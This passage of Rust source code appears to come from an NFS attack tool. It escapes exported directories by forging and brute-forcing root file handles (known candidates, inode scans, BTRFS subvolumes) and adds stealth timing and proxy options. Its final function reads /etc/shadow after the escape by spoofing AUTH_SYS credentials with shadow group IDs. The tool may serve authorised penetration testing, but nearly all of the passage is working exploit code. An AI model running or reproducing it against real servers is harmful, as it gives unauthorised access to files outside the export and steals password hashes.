        let ops = vec![ArgOp::Putfh(fh.to_vec()), ArgOp::Lookup(name.to_owned()), ArgOp::Getfh];
        if let Ok(res) = client.compound(ops).await
            && res.status == 0
        {
            return true;
        }
    }
    false
}

/// Print the NFSv4 LOOKUPP escape success report.
fn print_nfs4_lookupp_success(root_handle: &FileHandle, host: &str) {
    let hex = root_handle.to_hex();
    println!();
    println!("  {}  NFSv4 LOOKUPP traversal -- filesystem root reached (RFC 7530 S16.14)", "[+]".bold().green());
    crate::output::print_handle("Root handle", &hex);
    crate::output::print_handle_next_steps(&hex, host);
    println!();
}

/// NFSv2 escape path for v2-only servers.
///
/// Uses MOUNT v1 to obtain the seed handle and Nfs2Client for GETATTR probes.
/// NFSv2 has no BADHANDLE oracle (all rejections are NFSERR_STALE per RFC 1094)
/// and handles are fixed 32 bytes. No post-escape shadow read (v2 has no ACCESS).
async fn find_escape_v2(host: &str, export: &str, max_root_scan: u32, globals: &GlobalOpts) -> anyhow::Result<EscapeOutcome> {
    use nfs_v2::wire::{FType, Nfs2FileHandle};

    let addr = parse_addr_with_port(host, globals.nfs_port)?;
    let mc = make_mount_client(globals);
    let mnt = mc.mount_v1(addr, export).await?;
    let seed = mnt.handle;

    let stealth = StealthConfig::new(globals.delay, globals.jitter);
    let (_pool, _circuit, client) = make_v2_client_with_hostname(addr, export, 0, 0, &[], stealth, globals.proxy.as_deref(), globals.nfs_port, &globals.hostname);

    // Guard: if the export already IS the filesystem root there is nothing outside the
    // export to reach. NFSv2 handles are opaque 32-byte blobs without a Linux header, so
    // we cannot use fingerprint_fs; instead check the export root's fileid directly.
    // fileid 2 = ext4/ext3 root; 32/64/128 = XFS root (varies by inode size).
    let export_fh = Nfs2FileHandle::from_bytes(seed.as_bytes());
    if let Ok(attrs) = client.getattr(&export_fh).await
        && attrs.ftype == FType::Directory
        && matches!(attrs.fileid, 2 | 32 | 64 | 128)
    {
        eprintln!("{}", crate::output::status_info(&format!("Export {host}:{export} already is the filesystem root -- nothing outside the export to reach")));
        return Ok(EscapeOutcome::Unsupported);
    }

    let mut found_stale = false;

    // Phase 1: known root candidates
    let known = FileHandleAnalyzer::construct_root_candidates(&seed);
    for candidate in &known {
        let fh = Nfs2FileHandle::from_bytes(candidate.root_handle.as_bytes());
        match client.getattr(&fh).await {
            Ok(a) if a.ftype == FType::Directory => {
                return Ok(EscapeOutcome::Success { candidate: candidate.clone(), note: "verified (NFSv2)".to_owned() });
            },
            Err(e) if matches!(e.status(), Some(nfs_v2::Nfs2Stat::Stale)) => {
                found_stale = true;
            },
            _ => {},
        }
    }

    // Phase 2: inode scan
    for inode in 2..=max_root_scan {
        let Some(candidate) = FileHandleAnalyzer::construct_handle_for_inode(&seed, inode, 0) else { continue };
        let fh = Nfs2FileHandle::from_bytes(candidate.root_handle.as_bytes());
        match client.getattr(&fh).await {
            Ok(a) if a.ftype == FType::Directory => {
                return Ok(EscapeOutcome::Success { candidate, note: "found via scan (NFSv2)".to_owned() });
            },
            Err(e) if matches!(e.status(), Some(nfs_v2::Nfs2Stat::Stale)) => {
                found_stale = true;
            },
            _ => {},
        }
    }

    // Phase 3: BTRFS subvolume handles.
    // BTRFS handles are 32 bytes on Linux knfsd, matching NFSv2's fixed FHSIZE exactly.
    // construct_btrfs_subvol_handles returns variable-length FileHandles; Nfs2FileHandle::from_bytes
    // takes the first 32 bytes (or pads shorter handles with zeros).
    let btrfs = FileHandleAnalyzer::construct_btrfs_subvol_handles(&seed, DEFAULT_BTRFS_SUBVOLS);
    for candidate in &btrfs {
        let fh = Nfs2FileHandle::from_bytes(candidate.root_handle.as_bytes());
        match client.getattr(&fh).await {
            Ok(a) if a.ftype == FType::Directory => {
                return Ok(EscapeOutcome::Success { candidate: candidate.clone(), note: "subvolume (verified, NFSv2)".to_owned() });
            },
            Err(e) if matches!(e.status(), Some(nfs_v2::Nfs2Stat::Stale)) => {
                found_stale = true;
            },
            _ => {},
        }
    }

    Ok(if found_stale { EscapeOutcome::StaleNoRoot } else { EscapeOutcome::Unsupported })
}

/// After a successful escape, automatically try to read /etc/shadow.
///
/// On Debian/Ubuntu, /etc/shadow is mode 0640 owned by root:shadow (GID 42).
/// On SUSE, shadow GID is 15. Reading succeeds even without no_root_squash
/// because we can claim GID 42/15 via AUTH_SYS.
async fn try_read_shadow_post_escape(client: &Nfs3Client, root_fh: &FileHandle) {
    // Shadow GIDs: 42 = Debian/Ubuntu, 15 = SUSE/openSUSE
    const SHADOW_GIDS: &[(u32, &str)] = &[(42, "Debian/Ubuntu shadow"), (15, "SUSE shadow")];

    let Ok((etc_fh, _)) = client.resolve(root_fh, "etc").await else { return };

    let Ok((shadow_fh, _)) = client.resolve(&etc_fh, "shadow").await else {
        eprintln!("{}", crate::output::status_info("/etc/shadow not found (non-standard OS or no shadow file)"));
        return;
    };

    for &(gid, label) in SHADOW_GIDS {
        let cred = Credential::Sys(AuthSys::with_groups(0, gid, &[gid], "nfswolf"));
        let shadow_client = client.with_credential(cred, 0, gid);
        if let Ok(chunk) = shadow_client.read_at(&shadow_fh, 0, 65536).await {
            let content = String::from_utf8_lossy(&chunk.data);
            eprintln!("{}", crate::output::status_ok(&format!("/etc/shadow readable via GID {gid} ({label}):")));
            for line in content.lines().take(10) {
                println!("  {line}");
            }
            return;
        }
    }

    eprintln!("{}", crate::output::status_info("/etc/shadow: not readable via shadow GID (root_squash active or shadow hardened)"));
}
